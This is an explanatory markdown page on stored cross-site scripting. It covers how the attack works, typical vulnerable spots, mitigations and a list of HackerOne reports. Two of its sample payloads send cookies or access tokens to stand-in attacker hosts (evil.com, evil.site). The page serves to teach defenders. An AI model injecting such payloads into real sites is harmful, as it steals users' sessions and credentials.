<img width="1455" height="624" alt="S" src="https://github.com/user-attachments/assets/8846b1c6-ef1f-4df6-8780-d6ef5435a516" />

## What is Stored XSS?

**Stored XSS**, also known as **Persistent XSS**, is a type of Cross-Site Scripting vulnerability where **malicious JavaScript code is permanently stored on the target server**, such as in a database, comment field, forum post, or user profile. Every time a user accesses that data, the malicious script is executed in their browser.

This is different from **Reflected XSS**, where the payload is only reflected temporarily (e.g., in the URL) and executed immediately in the response.

---

##  How It Works 

1. **Attacker submits a malicious payload** (usually JavaScript) into a vulnerable input field that gets **stored on the server**.
2. The input is stored **without being properly sanitized or encoded**.
3. When a **victim visits a page** where this input is retrieved and rendered (like a comment or profile), the browser **executes the JavaScript code**.
4. This code can perform malicious actions like:

   * Stealing session cookies
   * Redirecting users
   * Logging keystrokes
   * Performing actions on behalf of the victim (like changing passwords or posting messages)

---

##  Where Does It Typically Happen?

* **Comment sections** (e.g., blog posts)
* **User profiles / bios**
* **Product reviews or feedback**
* **Forum posts**
* **Chat messages**
* **Support tickets**
* **Admin panels that render user data**

---

##  Example 1 – Comment Section Vulnerability

###  Scenario

A blog allows users to comment, and comments are stored in a database. It does not sanitize the input before displaying.

###  Payload

```html
<script>fetch('https://evil.com?c=' + document.cookie)</script>
```

###  Flow

1. Attacker submits the comment with the script.
2. It gets stored in the database as-is.
3. Anyone (including the admin) who reads the blog sees the comment, and their browser **executes** the script.
4. Their session cookie gets sent to the attacker.

---

##  Example 2 – User Bio/Profile

### Scenario

A website displays your bio on your public profile, and it stores your bio in a database without sanitizing it.

### Payload

```html
<img src="x" onerror="alert('XSS from bio')">
```

### Flow

1. Attacker puts this in their bio.
2. Every user who views the attacker's profile **triggers the alert**.

---

##  Example 3 – Chat Application

### Scenario

A real-time chat app renders chat messages as HTML without encoding.

### Payload

```html
<script>location='http://evil.site?token='+localStorage.getItem('token')</script>
```

### Flow

1. Attacker sends the script in a chat message.
2. When the victim opens the chat, the code runs and **steals their access token**.

---

##  How to Prevent Stored XSS

| Mitigation Technique                  | Description                                                                                                                     |
| ------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| **Input Validation**                  | Reject or sanitize dangerous characters on input (e.g., `<`, `>`, `"`).                                                         |
| **Output Encoding**                   | Always encode user data before rendering it into HTML (use libraries like `OWASP Java Encoder` or `htmlspecialchars()` in PHP). |
| **Content Security Policy (CSP)**     | Add CSP headers to restrict sources of executable scripts.                                                                      |
| **HTTPOnly Cookies**                  | Prevent access to cookies via JavaScript.                                                                                       |
| **Use frameworks with auto-escaping** | Frameworks like React, Django, or Ruby on Rails help prevent XSS by design.                                                     |

---

##  Real-World Impact

Stored XSS is **more dangerous than reflected XSS** because:

* It can affect **every user who views the stored content**.
* It can **persist indefinitely** unless removed.
* It can be **used in mass exploitation** (e.g., worm-like attacks across user accounts).
* Often affects **admins**, leading to **privilege escalation** or **complete system compromise**.

---

Here’s a table featuring **six real-world Stored XSS reports** from HackerOne. Each entry includes the vulnerability name and company, a brief description, and a **clickable link** to view the full report:

---

###  Stored XSS HackerOne Reports

| Vulnerability & Company                                 | Description                                                           | Report Link                                                           |
| ------------------------------------------------------- | --------------------------------------------------------------------- | --------------------------------------------------------------------- |
| **Stored XSS on X / xAI (#485748)**                     | Persistent XSS via comment input stored and executed on reports pages | [#485748](https://hackerone.com/reports/485748)   |
| **Shopify – Stored XSS in /admin/product (#1147433)**   | Malicious code injected in product HTML editor and stored in admin    | [#1147433](https://hackerone.com/reports/1147433)  |
| **GitLab – Stored XSS in user notes (#1481207)**        | Script injection within profile notes, bypassing CSP                  | [1481207](https://hackerone.com/reports/1481207)  |
| **Acronis – Stored XSS in profile page (#1084183)**     | Payload stored in user profile, executed on profile visits            | [1084183](https://hackerone.com/reports/1084183)  |
| **HackerOne – Stored XSS via custom fields (#1173040)** | Stored XSS in custom fields, executed when viewing reports            | [1173040](https://hackerone.com/reports/1173040)  |
| **Shopify – Stored XSS at Linkpop (#1441988)**          | Malicious payload in admin dashboard affecting Linkpop links          | [1441988](https://hackerone.com/reports/1441988)  |

